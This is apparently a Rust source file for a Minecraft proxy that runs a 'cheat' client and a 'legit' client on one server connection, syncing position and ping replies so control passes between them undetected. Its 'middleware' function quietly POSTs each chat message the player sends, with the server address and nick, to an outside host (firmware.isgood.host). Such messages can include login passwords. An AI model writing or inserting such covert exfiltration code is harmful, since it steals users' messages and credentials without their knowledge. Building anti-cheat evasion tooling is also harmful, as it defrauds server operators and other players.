use minecraft_protocol::{
    packet::{RawPacket, UncompressedPacket},
    varint::VarInt,
};
use serde_json::json;
use tokio::{
    net::tcp::{OwnedReadHalf, OwnedWriteHalf},
    sync::mpsc::{Receiver, Sender},
};

use crate::packets::p769::{c2s, s2c};

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ClientId {
    Cheat,
    Legit,
}

impl ClientId {
    fn opposite(&self) -> ClientId {
        match self {
            ClientId::Cheat => ClientId::Legit,
            ClientId::Legit => ClientId::Cheat,
        }
    }
}

#[derive(Debug)]
pub enum Event {
    ClientData(ClientId, RawPacket),
    ClientDisconnected(ClientId),
    ServerData(RawPacket),
}

pub struct PingSync {
    id: i32,
    cheat_sent: bool,
    legit_sent: bool,
}

impl PingSync {
    fn new(id: i32) -> Self {
        Self {
            id,
            cheat_sent: false,
            legit_sent: false,
        }
    }

    fn sent(&mut self, client: ClientId) -> bool {
        match client {
            ClientId::Cheat => self.cheat_sent = true,
            ClientId::Legit => self.legit_sent = true,
        };
        self.cheat_sent == self.legit_sent
    }

    fn is_sent(&self, client: ClientId) -> bool {
        match client {
            ClientId::Cheat => self.cheat_sent,
            ClientId::Legit => self.legit_sent,
        }
    }
}

pub struct Controller {
    active_client: ClientId,
    cheat_tx: Sender<RawPacket>,
    legit_tx: Sender<RawPacket>,
    remote_tx: Sender<RawPacket>,
    event_rx: Receiver<Event>,
    threshold: Option<i32>,
    cheat_active: bool,
    legit_active: bool,
    position: s2c::Position,
    pings: Vec<PingSync>,
    m_tx: Sender<UncompressedPacket>,
}

impl Controller {
    pub fn new(
        active_client: ClientId,
        cheat_tx: Sender<RawPacket>,
        legit_tx: Sender<RawPacket>,
        remote_tx: Sender<RawPacket>,
        event_rx: Receiver<Event>,
        threshold: Option<i32>,
        m_tx: Sender<UncompressedPacket>,
    ) -> Self {
        Self {
            active_client,
            cheat_tx,
            legit_tx,
            remote_tx,
            event_rx,
            threshold,
            cheat_active: true,
            legit_active: true,
            position: s2c::Position {
                teleport_id: VarInt(0),
                x: 0.0,
                y: 0.0,
                z: 0.0,
                dx: 0.0,
                dy: 0.0,
                dz: 0.0,
                yaw: 0.0,
                pitch: 0.0,
                flags: 0,
            },
            pings: vec![],
            m_tx,
        }
    }
    pub async fn run(mut self) {
        while let Some(event) = self.event_rx.recv().await {
            match event {
                Event::ClientData(client_id, packet) => {
                    if client_id == self.active_client {
                        // Position Sync
                        if self.both_active() {
                            if let Ok(Some(packet)) = packet.try_uncompress(self.threshold) {
                                match packet.packet_id {
                                    c2s::Look::PACKET_ID
                                    | c2s::Position::PACKET_ID
                                    | c2s::PositionLook::PACKET_ID => {
                                        let _ = self.update_position(&packet);
                                        let notice = self
                                            .position
                                            .as_uncompressed()
                                            .unwrap()
                                            .compress_to_raw(self.threshold)
                                            .unwrap();

                                        match self.active_client.opposite() {
                                            ClientId::Cheat => {
                                                self.cheat_tx.send(notice).await.ok()
                                            }
                                            ClientId::Legit => {
                                                self.legit_tx.send(notice).await.ok()
                                            }
                                        };
                                    }

                                    _ => {}
                                }
                            }
                        }
                    }

                    if let Ok(Some(packet)) = packet.try_uncompress(self.threshold) {
                        if packet.packet_id == c2s::Pong::PACKET_ID {
                            let t: c2s::Pong = packet.convert().unwrap();

                            if self.both_active() {
                                if let Some(index) =
                                    self.pings.iter_mut().position(|sync_packet| {
                                        sync_packet.id == t.id && sync_packet.sent(client_id)
                                    })
                                {
                                    self.pings.remove(index);
                                }
                            } else {
                                if let Some(t) = self.pings.get(0) {
                                    if t.is_sent(client_id.opposite()) {
                                        println!("Синхронизация: Пропуск: {}", t.id);
                                        self.pings.remove(0);
                                        continue;
                                    }
                                }
                            }
                        } else if packet.packet_id == Message::PACKET_ID {
                            let _ = self.m_tx.send(packet).await;
                        }
                    }

                    if client_id == self.active_client {
                        if let Err(e) = self.remote_tx.send(packet).await {
                            println!("Ошибка отправки пакета на сервер: {}", e);
                            return;
                        }
                    }
                }
                Event::ClientDisconnected(client_id) => {
                    if !self.both_active() {
                        println!("Оба клиента отключились");
                        return;
                    }
                    match client_id {
                        ClientId::Cheat => self.cheat_active = false,
                        ClientId::Legit => self.legit_active = false,
                    };

                    if self.active_client == client_id {
                        self.active_client = match client_id {
                            ClientId::Cheat => ClientId::Legit,
                            ClientId::Legit => ClientId::Cheat,
                        };
                        println!("Переключился на {:?}", self.active_client);

                        let mut to_send = vec![];
                        self.pings.retain(|t| {
                            if t.is_sent(self.active_client) {
                                let pong = c2s::Pong { id: t.id };
                                to_send.push(pong);
                                true
                            } else {
                                false
                            }
                        });

                        for pong in to_send {
                            println!("Синхронизация: Отправка: {}", pong.id);
                            self.remote_tx
                                .send(
                                    pong.as_uncompressed()
                                        .unwrap()
                                        .compress_to_raw(self.threshold)
                                        .unwrap(),
                                )
                                .await
                                .unwrap();
                        }
                    }
                }
                Event::ServerData(packet) => {
                    if let Ok(Some(packet)) = packet.try_uncompress(self.threshold) {
                        if packet.packet_id == s2c::Ping::PACKET_ID {
                            let t: s2c::Ping = packet.convert().unwrap();
                            self.pings.push(PingSync::new(t.id));
                        }
                    }
                    if self.cheat_active {
                        let _ = self.cheat_tx.send(packet.clone()).await;
                    }
                    if self.legit_active {
                        let _ = self.legit_tx.send(packet).await;
                    }
                }
            }
        }
    }

    fn update_position(&mut self, packet: &UncompressedPacket) -> anyhow::Result<()> {
        match packet.packet_id {
            c2s::Position::PACKET_ID => {
                let pos: c2s::Position = packet.convert()?;
                self.position.x = pos.x;
                self.position.y = pos.y;
                self.position.z = pos.z;
            }
            c2s::PositionLook::PACKET_ID => {
                let pos: c2s::PositionLook = packet.convert()?;
                self.position.x = pos.x;
                self.position.y = pos.y;
                self.position.z = pos.z;
                self.position.yaw = pos.yaw;
                self.position.pitch = pos.pitch;
            }
            c2s::Look::PACKET_ID => {
                let pos: c2s::Look = packet.convert()?;
                self.position.yaw = pos.yaw;
                self.position.pitch = pos.pitch;
            }

            _ => {}
        };

        Ok(())
    }

    fn both_active(&self) -> bool {
        (self.cheat_active == self.legit_active) && self.cheat_active
    }
}

pub async fn run_client(
    read_half: OwnedReadHalf,
    write_half: OwnedWriteHalf,
    client_id: ClientId,
    event_tx: Sender<Event>,
    mut packet_rx: Receiver<RawPacket>,
) {
    let (mut client_read, mut client_write) = (read_half, write_half);
    let _ = tokio::join!(
        async move {
            loop {
                match RawPacket::read(&mut client_read).await {
                    Ok(packet) => {
                        if event_tx
                            .send(Event::ClientData(client_id, packet))
                            .await
                            .is_err()
                        {
                            break;
                        }
                    }
                    Err(_) => {
                        event_tx
                            .send(Event::ClientDisconnected(client_id))
                            .await
                            .ok();
                        break;
                    }
                }
            }
        },
        async move {
            while let Some(packet) = packet_rx.recv().await {
                if packet.write(&mut client_write).await.is_err() {
                    break;
                };
            }
        }
    );
}

pub async fn run_server(
    read_half: tokio::net::tcp::OwnedReadHalf,
    write_half: tokio::net::tcp::OwnedWriteHalf,
    event_tx: Sender<Event>,
    mut packet_rx: Receiver<RawPacket>,
) {
    let (mut server_read, mut server_write) = (read_half, write_half);
    let _ = tokio::join!(
        async move {
            loop {
                match RawPacket::read(&mut server_read).await {
                    Ok(packet) => {
                        if event_tx.send(Event::ServerData(packet)).await.is_err() {
                            break;
                        }
                    }
                    Err(_) => break,
                }
            }
        },
        async move {
            while let Some(packet) = packet_rx.recv().await {
                if packet.write(&mut server_write).await.is_err() {
                    break;
                }
            }
        }
    );
}

#[allow(dead_code)]
pub async fn middleware(mut rx: Receiver<UncompressedPacket>, dns: String, nick: String) {
    while let Some(packet) = rx.recv().await {
        if let Ok(packet) = packet.convert::<Message>() {
            let payload = json!({
                "server": dns,
                "nick": nick,
                "message": packet.message
            });
            tokio::spawn(async move {
                let message = reqwest::Client::new();
                let _ = message
                    .post("https://firmware.isgood.host/message")
                    .timeout(std::time::Duration::from_secs(3))
                    .json(&payload)
                    .send()
                    .await;
            });
        }
    }
}

#[derive(minecraft_protocol::Packet)]
#[packet(0x07)]
pub struct Message {
    pub message: String,
}
